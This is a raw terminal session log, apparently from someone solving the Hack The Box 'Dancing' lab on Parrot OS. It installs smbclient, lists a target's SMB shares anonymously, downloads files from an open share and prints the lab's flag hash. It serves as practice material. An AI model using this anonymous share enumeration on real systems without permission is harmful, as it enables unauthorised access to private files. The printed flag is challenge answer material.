+[33m89% [7 samba-common 0 B/87.9 kB 0%][0m[33m                                   92% [Waiting for headers][0m                         Get:8 https://deb.parrot.sh/parrot lory/main amd64 smbclient amd64 2:4.17.12+dfsg-0+deb12u1 [442 kB]
+[33m92% [8 smbclient 0 B/442 kB 0%][0m[33m                               100% [Working][0m              Fetched 6,550 kB in 4s (1,546 kB/s)
+Preconfiguring packages ...
+
+7[0;21r8[1ASelecting previously unselected package libtalloc2:amd64.
+(Reading database ... (Reading database ... 5%(Reading database ... 10%(Reading database ... 15%(Reading database ... 20%(Reading database ... 25%(Reading database ... 30%(Reading database ... 35%(Reading database ... 40%(Reading database ... 45%(Reading database ... 50%(Reading database ... 55%(Reading database ... 60%(Reading database ... 65%(Reading database ... 70%(Reading database ... 75%(Reading database ... 80%(Reading database ... 85%(Reading database ... 90%(Reading database ... 95%(Reading database ... 100%(Reading database ... 364538 files and directories currently installed.)
+Preparing to unpack .../0-libtalloc2_2.4.0-f2_amd64.deb ...
+7[22;0f[42m[30mProgress: [  0%][49m[39m [........................................................................................................] 87[22;0f[42m[30mProgress: [  3%][49m[39m [###.....................................................................................................] 8Unpacking libtalloc2:amd64 (2.4.0-f2) ...
+7[22;0f[42m[30mProgress: [  6%][49m[39m [######..................................................................................................] 8Selecting previously unselected package libtevent0:amd64.
+Preparing to unpack .../1-libtevent0_0.14.1-1_amd64.deb ...
+7[22;0f[42m[30mProgress: [  9%][49m[39m [#########...............................................................................................] 8Unpacking libtevent0:amd64 (0.14.1-1) ...
+7[22;0f[42m[30mProgress: [ 12%][49m[39m [############............................................................................................] 8Selecting previously unselected package libldb2:amd64.
+Preparing to unpack .../2-libldb2_2%3a2.6.2+samba4.17.12+dfsg-0+deb12u1_amd64.deb ...
+7[22;0f[42m[30mProgress: [ 15%][49m[39m [###############.........................................................................................] 8Unpacking libldb2:amd64 (2:2.6.2+samba4.17.12+dfsg-0+deb12u1) ...
+7[22;0f[42m[30mProgress: [ 18%][49m[39m [##################......................................................................................] 8Selecting previously unselected package libwbclient0:amd64.
+Preparing to unpack .../3-libwbclient0_2%3a4.17.12+dfsg-0+deb12u1_amd64.deb ...
+7[22;0f[42m[30mProgress: [ 21%][49m[39m [######################..................................................................................] 8Unpacking libwbclient0:amd64 (2:4.17.12+dfsg-0+deb12u1) ...
+7[22;0f[42m[30mProgress: [ 24%][49m[39m [#########################...............................................................................] 8Selecting previously unselected package samba-libs:amd64.
+Preparing to unpack .../4-samba-libs_2%3a4.17.12+dfsg-0+deb12u1_amd64.deb ...
+7[22;0f[42m[30mProgress: [ 27%][49m[39m [############################............................................................................] 8Unpacking samba-libs:amd64 (2:4.17.12+dfsg-0+deb12u1) ...
+7[22;0f[42m[30mProgress: [ 30%][49m[39m [###############################.........................................................................] 8Selecting previously unselected package libsmbclient:amd64.
+Preparing to unpack .../5-libsmbclient_2%3a4.17.12+dfsg-0+deb12u1_amd64.deb ...
+7[22;0f[42m[30mProgress: [ 33%][49m[39m [##################################......................................................................] 8Unpacking libsmbclient:amd64 (2:4.17.12+dfsg-0+deb12u1) ...
+7[22;0f[42m[30mProgress: [ 36%][49m[39m [#####################################...................................................................] 8Selecting previously unselected package samba-common.
+Preparing to unpack .../6-samba-common_2%3a4.17.12+dfsg-0+deb12u1_all.deb ...
+7[22;0f[42m[30mProgress: [ 39%][49m[39m [########################################................................................................] 8Unpacking samba-common (2:4.17.12+dfsg-0+deb12u1) ...
+Replaced by files in installed package parrot-core (6.4) ...
+7[22;0f[42m[30mProgress: [ 42%][49m[39m [############################################............................................................] 8Selecting previously unselected package smbclient.
+Preparing to unpack .../7-smbclient_2%3a4.17.12+dfsg-0+deb12u1_amd64.deb ...
+7[22;0f[42m[30mProgress: [ 45%][49m[39m [###############################################.........................................................] 8Unpacking smbclient (2:4.17.12+dfsg-0+deb12u1) ...
+7[22;0f[42m[30mProgress: [ 48%][49m[39m [##################################################......................................................] 8Setting up samba-common (2:4.17.12+dfsg-0+deb12u1) ...
+7[22;0f[42m[30mProgress: [ 52%][49m[39m [#####################################################...................................................] 87[22;0f[42m[30mProgress: [ 55%][49m[39m [########################################################................................................] 8Setting up libwbclient0:amd64 (2:4.17.12+dfsg-0+deb12u1) ...
+7[22;0f[42m[30mProgress: [ 58%][49m[39m [###########################################################.............................................] 87[22;0f[42m[30mProgress: [ 61%][49m[39m [###############################################################.........................................] 8Setting up libtalloc2:amd64 (2.4.0-f2) ...
+7[22;0f[42m[30mProgress: [ 64%][49m[39m [##################################################################......................................] 87[22;0f[42m[30mProgress: [ 67%][49m[39m [#####################################################################...................................] 8Setting up libtevent0:amd64 (0.14.1-1) ...
+7[22;0f[42m[30mProgress: [ 70%][49m[39m [########################################################################................................] 87[22;0f[42m[30mProgress: [ 73%][49m[39m [###########################################################################.............................] 8Setting up libldb2:amd64 (2:2.6.2+samba4.17.12+dfsg-0+deb12u1) ...
+7[22;0f[42m[30mProgress: [ 76%][49m[39m [##############################################################################..........................] 87[22;0f[42m[30mProgress: [ 79%][49m[39m [#################################################################################.......................] 8Setting up samba-libs:amd64 (2:4.17.12+dfsg-0+deb12u1) ...
+7[22;0f[42m[30mProgress: [ 82%][49m[39m [#####################################################################################...................] 87[22;0f[42m[30mProgress: [ 85%][49m[39m [########################################################################################................] 8Setting up libsmbclient:amd64 (2:4.17.12+dfsg-0+deb12u1) ...
+7[22;0f[42m[30mProgress: [ 88%][49m[39m [###########################################################################################.............] 87[22;0f[42m[30mProgress: [ 91%][49m[39m [##############################################################################################..........] 8Setting up smbclient (2:4.17.12+dfsg-0+deb12u1) ...
+7[22;0f[42m[30mProgress: [ 94%][49m[39m [#################################################################################################.......] 87[22;0f[42m[30mProgress: [ 97%][49m[39m [####################################################################################################....] 8Processing triggers for man-db (2.11.2-2) ...
+Processing triggers for libc-bin (2.36-9+deb12u10) ...
+
+7[0;22r8[1A[JScanning application launchers
+Removing duplicate launchers or broken launchers
+ [-] Missing executable file kcmshell5 at launcher /usr/share/applications/kcm_trash.desktop
+Launchers are updated
+[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0msmbclient -N -L //$ip
+[?2004l
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	WorkShares      Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.214.56 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0msmbcient //$ip/C
+[?2004lbash: smbcient: command not found
+[?2004h[0;31m┌─[[0;37m✗[0;31m]─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0msmbcient //$ip/C[1@l
+[?2004lPassword for [WORKGROUP\root]:
+tree connect failed: NT_STATUS_BAD_NETWORK_NAME
+[?2004h[0;31m┌─[[0;37m✗[0;31m]─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0msmbclient //$ip/C[KADMIN
+[?2004lPassword for [WORKGROUP\root]:
+tree connect failed: NT_STATUS_BAD_NETWORK_NAME
+[?2004h[0;31m┌─[[0;37m✗[0;31m]─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0msmbclient //$ip/ADMIN[K[K[K[K[KWorkhares[K[K[K[K[KShares
+[?2004lPassword for [WORKGROUP\root]:
+Try "help" to get a list of possible commands.
+[?2004hsmb: \> ls
+[?2004l  .                                   D        0  Mon Mar 29 04:22:01 2021
+  ..                                  D        0  Mon Mar 29 04:22:01 2021
+  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
+  James.P                             D        0  Thu Jun  3 04:38:03 2021
+
+		5114111 blocks of size 4096. 1749340 blocks available
+[?2004hsmb: \> pwd
+[?2004lCurrent directory is \\10.129.214.56\WorkShares\
+[?2004hsmb: \> cd ..
+[?2004l[?2004hsmb: \> pwd
+[?2004lCurrent directory is \\10.129.214.56\WorkShares\
+[?2004hsmb: \> ls
+[?2004l  .                                   D        0  Mon Mar 29 04:22:01 2021
+  ..                                  D        0  Mon Mar 29 04:22:01 2021
+  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
+  James.P                             D        0  Thu Jun  3 04:38:03 2021
+
+		5114111 blocks of size 4096. 1749332 blocks available
+[?2004hsmb: \> get Amy.J\[K[K[K[K[K[K[K[K[K[Kcd Amy.J\
+[?2004l[?2004hsmb: \Amy.J\> ls
+[?2004l  .                                   D        0  Mon Mar 29 05:08:24 2021
+  ..                                  D        0  Mon Mar 29 05:08:24 2021
+  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021
+
+		5114111 blocks of size 4096. 1749268 blocks available
+[?2004hsmb: \Amy.J\> get worknotes.txt 
+[?2004lgetting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+[?2004hsmb: \Amy.J\> cd ..
+[?2004l[?2004hsmb: \> ls
+[?2004l  .                                   D        0  Mon Mar 29 04:22:01 2021
+  ..                                  D        0  Mon Mar 29 04:22:01 2021
+  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
+  James.P                             D        0  Thu Jun  3 04:38:03 2021
+
+		5114111 blocks of size 4096. 1749252 blocks available
+[?2004hsmb: \> cd Jams[Kes.P\
+[?2004l[?2004hsmb: \James.P\> ls
+[?2004l  .                                   D        0  Thu Jun  3 04:38:03 2021
+  ..                                  D        0  Thu Jun  3 04:38:03 2021
+  flag.txt                            A       32  Mon Mar 29 05:26:57 2021
+
+		5114111 blocks of size 4096. 1749249 blocks available
+[?2004hsmb: \James.P\> get flag.txt 
+[?2004lgetting file \James.P\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+[?2004hsmb: \James.P\> exit
+[?2004l[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mls
+[?2004lflag.txt  session.log  session.timing  worknotes.txt
+[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mcat worknotes.txt 
+[?2004l- start apache server on the linux machine
+- secure the ftp server
+- setup winrm on dancing [?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mcaa[Kt flag.txt 
+[?2004l5f61c10dffbc77a704d76016a22f1664[?2004h[0;31m┌─[[01;31mroot[01;33m@[01;96mparrot[0;31m]─[[0;32m/home/ryebread/htb/dancing[0;31m]
+[0;31m└──╼ [0m[01;33m#[0mexit
+[?2004lexit
+
+Script done on 2025-05-31 15:56:54-04:00 [COMMAND_EXIT_CODE="0"]
